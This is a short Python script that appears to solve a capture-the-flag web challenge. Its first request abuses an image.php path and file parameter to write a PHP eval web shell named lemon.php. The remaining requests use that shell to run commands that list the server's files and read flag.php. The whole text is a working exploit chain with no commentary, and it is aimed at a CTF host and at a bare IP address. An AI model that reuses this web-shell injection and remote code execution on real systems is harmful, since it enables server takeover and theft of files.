import requests

u1 = "http://ques.synctf.com:29510/image.php?path=lemon.php&file=http%3A%2F%2F127.0.0.1%3A8888%2F%3Fdate%2F%3C%3Fphp%2520eval(%24_GET%5B1%5D)%3B%3F%3E%2F"
r = requests.get(u1)

u2 = "http://54.223.231.220/lemon.php?1=var_dump(glob('*'));"
r1 = requests.get(u2)
print r1.content

u2 = "http://54.223.231.220/lemon.php?1=echo%20file_get_contents('flag.php');"
r1 = requests.get(u2)
print r1.content